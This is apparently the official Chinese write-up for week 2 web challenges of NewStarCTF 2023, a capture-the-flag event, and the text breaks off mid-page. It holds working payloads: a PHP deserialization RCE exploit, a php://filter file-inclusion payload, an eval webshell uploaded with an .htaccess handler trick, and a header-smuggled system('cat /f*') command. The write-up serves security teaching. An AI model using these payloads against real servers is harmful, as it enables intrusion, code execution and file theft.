        <div id="file-page-header"><div id="ToastsContainer_ShimoUI"><div class="Toastify"></div></div><div class="sc-exAgwC doEjVX"><div class="sc-cQFLBn jqmOiT"><div class="sc-gisBJw cbYHdA"><a class="sc-caSCKo iaSppr" href="https://shimo.im/desktop"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 106 25" class="sc-fAjcbJ kOTtUa"><path d="M24.9 2.9L23.1.8l-1.7 1.5H2l1 1.2c.1.1.2.1.3.1.2 0 3.3-.1 7.2-.1C8.3 9 5.8 14.1.2 18.6c-.1 0-.1.1-.1.2s.1.2.2.2h.1c5-3.2 7.8-6.8 8.1-7.3v12.8c0 .2.3.3.4.3.9-1.1 1.5-2.1 1.6-3.3 1 0 5.5 0 8-.1.3.3.5.3.7 1.3 0 .2.1.2.3.2h.1c1.7-1 1.9-1.9 1.9-5v-5.6c0-.1 0-.1.1-.2l.5-1.1c.1-.1.1-.2 0-.3l-1.9-1.1c-.1-.1-.3 0-.3.1l-.5 1.1c0 .1-.1.1-.2.1h-8.3l-1.2-.5c1.4-1.8 2-2.9 2.8-4.3.1-.2.1-.3.2-.3.2-.1.2-.3.1-.5l-.1-.1c-.7-.5-1.3-1-1.7-1.7 2.9-.1 13.8-.2 13.8-.2.1 0 .2-.1.1-.4zm-14.3 8.6l.3-.2h8.2c.1 0 .3.1.3.3v7.2c0 .5-.1 1.2-.6 1.7l-.2.1h-8v-9.1zm25.8 1.6c1.4.6 2.4 1.3 2.9 1.7s.5.8 0 1.4c-.1.2-.2.3-.6.6-.6.4-1 .3-1.2-.4-.3-1.6-.8-2.7-1.4-3.3.1.1.1 0 .3 0zm5.8 0c1.5.6 2.4 1.2 3 1.6.5.4.5.8.1 1.4-.1.2-.2.3-.6.7-.6.4-1 .3-1.2-.3-.4-1.6-.9-2.7-1.5-3.2 0-.1.1-.2.2-.2zm-8.5-.1l.1-.1c.1 0 .1 0 .1.1 0 0-.2 2.9-.5 3.5-.2.6-.6.8-1.3.6-.3-.1-1-.4-1-.4-.5-.3-.4-.8 0-1.1 1.5-.9 2.2-1.6 2.6-2.6zm19 9.5v.1c0 .1 0 .1-.1.1H30.3s-.1 0-.2-.1l-.7-.6h10.9v-2.3c-4.1 0-8.1.1-8.3.1 0 0-.1 0-.2-.1l-.7-.7h9.2v-3.6l2.1.5c.1 0 .1.1 0 .2l-.2.3V19h6.1l1.2-1.2 1.5 1.6v.1s0 .1-.1.1h-.1s-4.3 0-8.8.1V22h7l1.5-1.6 2.2 2.1zm-2.1-8.2c.6.3.7.7.3 1.5-.1.2-.1.4-.5.8-.5.5-1 .5-1.3-.1-.7-1.6-1.4-2.7-2.1-3.1-.1-.1 0-.2.1-.2 1.7.3 2.8.7 3.5 1.1zm1.3-1.7l.1.1c0 .1-.1.1-.1.1h-.1c-20.6-.1-20.6 0-20.8 0 0 0-.1 0-.2-.1l-.7-.7 10.2.1v-1.9h-7s-.1 0-.2-.1l-.7-.7 7.9.1V7.7h-6.5c-.4.4-1.1 1-1.4 1.2l-.1.1c-.1 0-.2-.1-.2-.2V1.7l2 .6h14.3l.6-1 1.1.6.7.3c.1 0 .1.1 0 .2l-.4.8v4.1l.1.2c.1.1-.1.3-.2.3h-7.9v1.8h5.1l1.1-1.1 1.5 1.5v.1s0 .1-.1.1h-7.7v1.9h7l1.2-1.1 1.4 1.6zm-9.7-9.8v4.3h1.5c.9-1.3 1.2-2.2 1.6-3.8 0-.1 0-.2.1-.2 0 0 .1 0 .1.1l1.3 1.2c.1.1.2.2 0 .4-.6 1.2-2.5 2.1-3.1 2.3h4.4V2.8h-5.9zm-2 4.3V2.8h-6.3v4.3h6.3zm-1.8-2.5c.4.3.4.7 0 1.3-.1.2-.2.3-.5.6-.5.4-.9.2-1.1-.3-.3-1.5-.7-2.5-1.3-3 0-.1 0-.2.1-.1 1.5.5 2.3 1.1 2.8 1.5zM67 4.5C66.3 2.4 65.6 1 64.7.4c-.1-.1 0-.3.2-.2 2 .6 3.1 1.5 3.9 2 .7.4.7 1 .2 1.9-.1.2-.3.5-.5.7-.6.7-1.2.5-1.5-.3zm11.8 16c.1 0 .2.1.2.3 0 .1-.1.2-.2.2s-.4.1-.6.1c-.8.1-2 .4-2.5 1.6l-.1.1-.1.1h-.2c-2-.9-6.5-3-8.1-4.7l-.1-.1c-2.4 2.2-5.4 3.6-10.6 5h-.1c-.1 0-.2-.1-.2-.2s.1-.2.1-.2c4.4-1.8 7.4-3.8 9.5-6-2.2-2.8-3-5.5-4-10h-4.4c-.1 0-.2 0-.3-.1l-.8-.9h18.8l1.5-1.6L78.3 6c.1.2 0 .3-.2.3 0 0-3.3.1-6.7.2.5.3 1.1.5 1.7.6 0 0 .1 0 .1.1.2.1.1.4-.1.4-.1 0-.4.2-.4.4-.7 2.7-2.3 6.4-4.2 8.5l-.2.2c3.2 2.1 6.6 2.9 10.5 3.8zm-16.1-14c1.2 4 2.7 6.8 4.5 8.7 1.9-2.6 2.9-5.5 3.6-8.8-2.4.1-4.8.1-5.9.1h-2.2zm42.9-3.2c.2.1.1.3-.1.4-.1 0-.3.2-.4.4-1.4 1.7-2.7 3.3-4.8 4.9h-.1c-.1 0-.2-.1-.2-.2s.1-.1.1-.2c1.6-2.7 2.2-4 3-6.4 0-.1.1-.2.2-.2s.2.1.2.1l.1.1c.6.3 1.4.8 2 1.1zM94 7.6c-.1-2.1-1.1-4.7-1.7-5.4 0-.1.1-.2.2-.2 1.6 1.3 2.3 2 3 2.6 1.1 1.1 1 2.5.4 3.2-.2.2-.2.3-.4.4-.9.6-1.4.3-1.5-.6zm-1.4 5.8c-.1.2-.3.3-.4.5-.5.5-1 .3-1.3-.3-.4-1.6-.9-2.6-1.5-3.2v9.8c-.1 1.3-.4 2.3-1.4 3.5-.2.1-.5 0-.5-.3V11.2c-.8 2.5-2.7 4.9-4.6 7 0 .1-.1.1-.1.1-.1.1-.2 0-.3-.1-.1-.1 0-.2 0-.3 3.1-4.4 4-7.9 4.7-11.1h-3.3s-.1 0-.2-.1L83 6l4.2.1h.3v-6l2.1.6c.1.1.1.1 0 .2l-.3.3v4.9h1L91.5 5l1.6 1.5.1.1c0 .1-.1.1-.1.1h-3.7v2.8c1.6.6 2.6 1.4 3.1 2 .4.6.6 1.2.1 1.9zm12.6-3.9c.1.1.1.2 0 .3l-.6 1.1c0 .1-.1.1-.1.2v6.2c0 3.4.1 4.5-1.8 5.7h-.1c-.2 0-.3 0-.3-.2-.3-1.1-.4-1.1-.8-1.4-2.8.1-8 .1-9.1.1l-.6-.8h9.8l.2-.1c.5-.6.7-1.3.7-1.9V16s-.1-.1-.2-.1h-9.4l-.6-.7h10v-4.6c0-.2-.1-.3-.3-.3h-9.4l-.6-.7h5.1V.1l2.2.6c.1.1.1.1 0 .2l-.4.3v8.3h3c.1 0 .2-.1.2-.1l.5-1c.1-.1.3-.2.4-.1l2.2 1.2z" fill="#a5a5a5"></path></svg></a></div><div class="sc-fMiknA fWfGDr">NewStarCTF 2023 Week2 官方WriteUp</div><button class="sc-lhVmIH iAQwBy"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width="20px" height="20px"><path d="M13.5 16.9V4.5h-7v12.4l3.5-3.5 3.5 3.5z" fill="none" stroke="#a5a5a5"></path></svg></button><div class="sc-elJkPf cuKFxh"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 14" class="sc-bYSBpT cZZyrb" width="12px" height="12px"><path d="M7 13c-3.3 0-6-2.7-6-6s2.7-6 6-6 6 2.7 6 6-2.7 6-6 6zm0-1c2.8 0 5-2.2 5-5S9.8 2 7 2 2 4.2 2 7s2.2 5 5 5zm2.2-8l.8.4L6.1 10 4 7l.7-.6L6.1 8l3.1-4z" fill="#7a9880"></path></svg>10月9日 21:36 更新</div></div><div class="sc-gojNiO hAHnBB"><span style="display:inline-block;cursor:not-allowed" class="file-demo-screen-btn"><button class="sm-button sc-hzDkRC iObLYz sc-1n784rm-0 sfCUt" type="primary" disabled="" style="pointer-events:none"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="sc-jhAzac cUDKsr" width="20px" height="20px"><path d="M10 17c-3.9 0-7-3.1-7-7s3.1-7 7-7 7 3.1 7 7-3.1 7-7 7zm0-1c3.3 0 6-2.7 6-6s-2.7-6-6-6-6 2.7-6 6 2.7 6 6 6zm-1.5-3.5v-5l4 2.4-4 2.6z" fill="#555"></path></svg></button></span><button class="register sc-btzYZH jVcKXm">注册</button><button class="login sc-btzYZH jVcKXm">登录</button><button class="sm-button sc-kvZOFW dStWqN sc-1n784rm-0 inYJrZ" type="default"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40" width="18px" height="18px"><path d="M18 12c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2zm0 9c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2zm0 9c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2z" fill="#41464b"></path></svg></button></div></div><div style="position: absolute; top: 0px; left: 0px; width: 100%;"><div><div class="sm-tooltip  randomClass-mvIob  sm-tooltip-theme-blue sm-tooltip-placement-bottom " style="z-index: 998; left: 958.094px; top: 39px;"><div class="sm-tooltip-content"><div class="sm-tooltip-arrow"></div><div class="sm-tooltip-inner"><span class="sc-cmTdod jqVHLt">开启更多功能，提升办公效能<span class="sc-jwKygS iyLjmU"></span></span></div></div></div></div></div></div>
        <div id="app-container" class="sm-docs-container external-readonly">
            <div id="editor-scroller" class="editor-scroller">
                <div id="editor" class="ql-container ql-disabled ql-snow ">
                    <div class="ql-title"><div class="ql-title-box" data-value="NewStarCTF 2023 Week2 官方WriteUp"><input data-value="NewStarCTF 2023 Week2 官方WriteUp" readonly="true" class="mousetrap" id="ql-title-input" autocomplete="off" autocorrect="off" spellcheck="false" value="NewStarCTF 2023 Week2 官方WriteUp"></div></div>
                    <div class="ql-editor"><p ql-global="true" class="ql-align-center ql-heading-title" line="LQ3x" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Web</p><h1><div ql-global="true" line="iSU4" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>游戏高手</div></h1><ul data-list-style="circle"><li ql-global="true" line="LPUN" class="bullet-item"><strong>考点</strong>：JavaScript分析</li></ul><ul data-list-style="circle"><li ql-global="true" line="uIZ7" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="kNlf" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="OW3H">去查看源代码中的app_v2.js文件内容，可以看到在游戏结束的处理时代码如下：</p><div class="ql-code-block-container" data-language="javascript" spellcheck="false"><div line="labz" data-language="javascript" class="ql-code-block"><span class="hljs-keyword">function</span> <span class="hljs-title function_">gameover</span>(<span class="hljs-params"></span>){</div><div line="6szn" data-language="javascript" class="ql-code-block">    <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>){</div><div line="C5fi" data-language="javascript" class="ql-code-block">        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</div><div line="M2Ov" data-language="javascript" class="ql-code-block">        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">"POST"</span>, <span class="hljs-string">"/api.php"</span>, <span class="hljs-literal">true</span>);</div><div line="BWCw" data-language="javascript" class="ql-code-block">        xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"application/json"</span>);</div><div line="lIhY" data-language="javascript" class="ql-code-block">        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {</div><div line="oUiY" data-language="javascript" class="ql-code-block">        <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) {</div><div line="VBq7" data-language="javascript" class="ql-code-block">            <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);</div><div line="y8Le" data-language="javascript" class="ql-code-block">            <span class="hljs-title function_">alert</span>(response.<span class="hljs-property">message</span>);</div><div line="bU71" data-language="javascript" class="ql-code-block">        }</div><div line="A1XY" data-language="javascript" class="ql-code-block">        };</div><div line="EceB" data-language="javascript" class="ql-code-block">        <span class="hljs-keyword">var</span> data = {</div><div line="mTRf" data-language="javascript" class="ql-code-block">            <span class="hljs-attr">score</span>: gameScore,</div><div line="QLtU" data-language="javascript" class="ql-code-block">        };</div><div line="FNeR" data-language="javascript" class="ql-code-block">        xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));</div><div line="6Cal" data-language="javascript" class="ql-code-block">    }</div><div line="5aB2" data-language="javascript" class="ql-code-block">	<span class="hljs-title function_">alert</span>(<span class="hljs-string">"成绩："</span>+gameScore);</div><div line="14He" data-language="javascript" class="ql-code-block">	gameScore=<span class="hljs-number">0</span>;  </div><div line="I44N" data-language="javascript" class="ql-code-block">	curPhase =<span class="hljs-variable constant_">PHASE_READY</span>;  </div><div line="HkQb" data-language="javascript" class="ql-code-block">	hero = <span class="hljs-literal">null</span>;</div><div line="3mgZ" data-language="javascript" class="ql-code-block">	hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();  	    </div><div line="CBeg" data-language="javascript" class="ql-code-block">}</div></div><p ql-global="true" line="Wbnk">可以看到当分数大于10w分的时候XHR会向api.php发送一个json数据包，json内容如下：</p><div class="ql-code-block-container" data-language="javascript" word-wrap="" spellcheck="false"><div line="wgzp" data-language="javascript" class="ql-code-block ql-word-wrap-true">{<span class="hljs-string">"score"</span>:gameScore}</div></div><p ql-global="true" line="RGv1">然后我们可以使用Burp Suite来完成发包：</p><p ql-global="true" line="4RLV"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1320" height="auto" ori-width="1320" src="./NewStarCTF 2023 Week2 官方WriteUp_files/图片.png" ori-height="337" data-src="https://uploader.shimo.im/f/ROryRfMOcpZeW7jF.png!thumbnail" crossorigin="anonymous"></span></span></span></p><div class="ql-code-block-container" data-language="plain" word-wrap="" spellcheck="false"><div line="9rei" data-language="plain" class="ql-code-block ql-word-wrap-true">POST /api.php HTTP/1.1</div><div line="N7Jw" data-language="plain" class="ql-code-block ql-word-wrap-true">Host: d1d8c388-e024-4994-9a21-27cd7e042989.node4.buuoj.cn:81</div><div line="VrWj" data-language="plain" class="ql-code-block ql-word-wrap-true">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0</div><div line="14H5" data-language="plain" class="ql-code-block ql-word-wrap-true">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</div><div line="ROrU" data-language="plain" class="ql-code-block ql-word-wrap-true">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div line="ItUE" data-language="plain" class="ql-code-block ql-word-wrap-true">Accept-Encoding: gzip, deflate, br</div><div line="Xpg8" data-language="plain" class="ql-code-block ql-word-wrap-true">Content-Type: application/json</div><div line="WOUh" data-language="plain" class="ql-code-block ql-word-wrap-true">Content-Length: 17</div><div line="k7sc" data-language="plain" class="ql-code-block ql-word-wrap-true">Connection: close</div><div line="OjHH" data-language="plain" class="ql-code-block ql-word-wrap-true"><br></div><div line="d4Lk" data-language="plain" class="ql-code-block ql-word-wrap-true">{"score":1000000}</div></div><p ql-global="true" line="7xdy">除此之外也可以直接在控制台设置gameScore的值，然后结束游戏就可以获得Flag：</p><p ql-global="true" line="uaOq"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="2398" height="auto" ori-width="2398" src="./NewStarCTF 2023 Week2 官方WriteUp_files/图片(1).png" ori-height="924" data-src="https://uploader.shimo.im/f/Y31SxSMySVXAHJEJ.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="BhF5"><br></p><h1><div ql-global="true" line="eT79" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Unserialize？</div></h1><ul data-list-style="circle"><li ql-global="true" line="JWBb" class="bullet-item"><strong>考点</strong>：PHP反序列化漏洞基础、RCE Bypass</li></ul><ul data-list-style="circle"><li ql-global="true" line="Cep5" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="j78g" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="QjWr">进入题目给出源码，思路很简单，只需要设置evil类中cmd成员的值然后反序列化触发__destruct析构函数即可触发RCE</p><p ql-global="true" line="wlHZ"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="677" height="auto" ori-width="677" src="./NewStarCTF 2023 Week2 官方WriteUp_files/图片(2).png" ori-height="315" data-src="https://uploader.shimo.im/f/Run8QEmv8FqgLjZq.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="Whkp">RCE的绕过也很简单，过滤了一些读取文件的命令，但是仍然很多命令可以用，例如head。</p><p ql-global="true" line="lz8x">需要注意的是这里的cmd是private属性的，因此需要对序列化字符串进行urlencode，构造Exp如下：</p><div class="ql-code-block-container" data-language="php" word-wrap="" spellcheck="false"><div line="i1FQ" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-meta">&lt;?php</span></div><div line="EbA6" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>{</div><div line="I7XL" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">'head /th1s_1s_fffflllll4444aaaggggg'</span>;</div><div line="Aau5" data-language="php" class="ql-code-block ql-word-wrap-true">}</div><div line="V021" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> evil));</div><div line="YUis" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment">//O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A35%3A%22head%20%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D</span></div></div><p ql-global="true" line="9gWb">注意要把命令中的加号替换为%20或者空格。</p><p ql-global="true" line="JFz7"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1041" height="auto" ori-width="1041" src="./NewStarCTF 2023 Week2 官方WriteUp_files/图片(3).png" ori-height="633" data-src="https://uploader.shimo.im/f/KB447pI4u9KmttrC.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="oLvK"><br></p><p ql-global="true" line="NL78"><br></p><h1><div ql-global="true" line="ftxJ" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>include 0。0</div></h1><ul data-list-style="circle"><li ql-global="true" line="IbdY" class="bullet-item"><strong>考点</strong>：PHP文件包含漏洞</li></ul><ul data-list-style="circle"><li ql-global="true" line="VVaI" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="9K5T" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="WoFy">进入题目给出源码，需要读取flag.php文件，读取PHP文件需要使用php://filter协议中的过滤器来对文件内容进行编码，但是这里过滤了base和rot。</p><p ql-global="true" line="mSRX"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="539" height="auto" ori-width="539" src="./NewStarCTF 2023 Week2 官方WriteUp_files/图片(4).png" ori-height="214" data-src="https://uploader.shimo.im/f/TbfsCmQ11pOa4TVW.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="sx3v">还有其他的一些过滤器可以使用，例如convert.iconv系列的过滤器，由此构造Payload：</p><div class="ql-code-block-container" data-language="plain" word-wrap="" spellcheck="false"><div line="uWcc" data-language="plain" class="ql-code-block ql-word-wrap-true">php://filter/convert.iconv.UTF-8.UTF-7/resource=flag.php</div></div><p ql-global="true" line="pwHJ">得到flag.php文件经过编码后的内容：</p><div class="ql-code-block-container" data-language="plain" word-wrap="" spellcheck="false"><div line="KyLr" data-language="plain" class="ql-code-block ql-word-wrap-true">+ADw?php //flag+AHs-bbf7eff4-e6b8-4fd6-bfd8-8b9679c002eb+AH0</div></div><p ql-global="true" line="wF4I">可以直接根据Flag格式转换出原本的文件内容：</p><div class="ql-code-block-container" data-language="plain" word-wrap="" spellcheck="false"><div line="oXzZ" data-language="plain" class="ql-code-block ql-word-wrap-true">flag{bbf7eff4-e6b8-4fd6-bfd8-8b9679c002eb}</div></div><p ql-global="true" line="WAsT">也可以找个在线的UTF-7转UTF-8工具：<a class="ql-link" href="https://www.novel.tools/decode/UTF-7?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMzMzYsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTY5ODE1MzAzNiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.NYa72qmxddXM9lcSzdala4nuJOWnkiUXyE99uwpsEwA" target="_blank" rel="noopener noreferrer nofollow">https://www.novel.tools/decode/UTF-7</a></p><p ql-global="true" line="dEiH">除了这个过滤器外还有很多可用的过滤器，解法不唯一。</p><h2><div ql-global="true" line="5Rwy" data-header="2" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><br></div></h2><h1><div ql-global="true" line="bhyo" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Upload again!</div></h1><ul data-list-style="circle"><li ql-global="true" line="P4lj" class="bullet-item"><strong>考点</strong>：PHP文件上传漏洞</li></ul><ul data-list-style="circle"><li ql-global="true" line="omrx" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="LROp" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="t9SK">本题主要考点是绕过后端对后缀名的限制,apache解析漏洞，绕过对文件内容的检测</p><p ql-global="true" line="0tAv">抓包上传上一次的1.jpg内容为</p><div class="ql-code-block-container" data-language="php" spellcheck="false"><div line="fhaE" data-language="php" class="ql-code-block"><span class="hljs-comment">//绕过&lt;?限制的一句话 </span></div><div line="bfr9" data-language="php" class="ql-code-block">&lt;script language=<span class="hljs-string">"php"</span>&gt;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'shell'</span>]);&lt;/script&gt;</div></div><p ql-global="true" line="y8DL"><br></p><p ql-global="true" class="ql-align-center" line="26vf"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="476px" height="auto" ori-width="798" src="./NewStarCTF 2023 Week2 官方WriteUp_files/图片(5).png" ori-height="950" data-src="https://uploader.shimo.im/f/g4R2A0tHD82c2dYf.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="pQdP">然后上传.htaccess文件，让服务器把.jpg文件当成php解析</p><div class="ql-code-block-container" data-language="php" spellcheck="false"><div line="HXT8" data-language="php" class="ql-code-block">AddType application/x-httpd-php .jpg</div></div><p ql-global="true" class="ql-align-center" line="oB6j"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="484px" height="auto" ori-width="760" src="./NewStarCTF 2023 Week2 官方WriteUp_files/1695138051227.png" ori-height="958" data-src="https://uploader.shimo.im/f/zjwpYWqpK7nnuBM8.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" class="ql-align-center" line="CjA0"><br></p><p ql-global="true" line="potY">然后访问1.jpg执行命令即可获得Flag：</p><p ql-global="true" line="Tmcd"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="616px" height="auto" ori-width="1388" src="./NewStarCTF 2023 Week2 官方WriteUp_files/图片(6).png" ori-height="439" data-src="https://uploader.shimo.im/f/7wZlXGccJH3WyW9d.png!thumbnail" crossorigin="anonymous"></span></span></span></p><h1><div ql-global="true" line="opJx" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><br></div></h1><h1><div ql-global="true" line="hOLp" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>R!!C!!E</div></h1><ul data-list-style="circle"><li ql-global="true" line="CYAP" class="bullet-item"><strong>考点</strong>：git源码泄露、无参数 RCE</li></ul><ul data-list-style="circle"><li ql-global="true" line="qx6a" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="tIpz" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="ZiO1">首先看到提示有信息泄露，可以使用dirsearch扫，扫出了 /.git ，使用GitHack工具获取源码。扫出index.php，就是主页的源码，没有有效信息，还有一个bo0g1pop.php ，代码如下：</p><div class="ql-code-block-container" data-language="php" word-wrap="" spellcheck="false"><div line="v3YG" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-meta">&lt;?php</span></div><div line="uaUR" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);</div><div line="iPD9" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">if</span> (<span class="hljs-string">';'</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/[^\W]+\((?R)?\)/'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'star'</span>])) {</div><div line="dgMN" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i'</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'star'</span>])){</div><div line="Ach6" data-language="php" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'star'</span>]);</div><div line="K0W6" data-language="php" class="ql-code-block ql-word-wrap-true">    }</div><div line="VdC0" data-language="php" class="ql-code-block ql-word-wrap-true">}</div></div><p ql-global="true" line="Tj85">第一个正则对提交的参数进行处理：任意字符加上可选的括号（允许嵌套）更换为空，然后判断是否等于分号，结合下面的 eval 可以知道就是无参数命令执行。</p><p ql-global="true" line="mVQ5">第二个正则过滤了一些常用的用于无参数命令执行的 php 方法，但过滤不全，可以使用类似功能的方法进行绕过，最终命令执行。</p><p ql-global="true" line="Ak75"><br></p><p ql-global="true" line="LTJH">payload（使用 bp 发送的请求）：</p><div class="ql-code-block-container" data-language="plain" word-wrap="" spellcheck="false"><div line="YOlC" data-language="plain" class="ql-code-block ql-word-wrap-true">GET /bo0g1pop.php?star=eval(pos(array_reverse(getallheaders()))); HTTP/1.1</div><div line="YMvi" data-language="plain" class="ql-code-block ql-word-wrap-true">Host: faf83665-1a88-473a-b765-ddd33c6cf370.node4.buuoj.cn:81</div><div line="5saL" data-language="plain" class="ql-code-block ql-word-wrap-true">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0</div><div line="Zavb" data-language="plain" class="ql-code-block ql-word-wrap-true">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</div><div line="gcXG" data-language="plain" class="ql-code-block ql-word-wrap-true">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div line="c5hZ" data-language="plain" class="ql-code-block ql-word-wrap-true">Accept-Encoding: gzip, deflate</div><div line="k9Xk" data-language="plain" class="ql-code-block ql-word-wrap-true">Connection: close</div><div line="OVSp" data-language="plain" class="ql-code-block ql-word-wrap-true">X-Forwarder-Proto: system('cat /f*');</div><div line="lLJw" data-language="plain" class="ql-code-block ql-word-wrap-true">Upgrade-Insecure-Requests: 1</div></div><p ql-global="true" class="ql-heading-title" line="w8V1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" 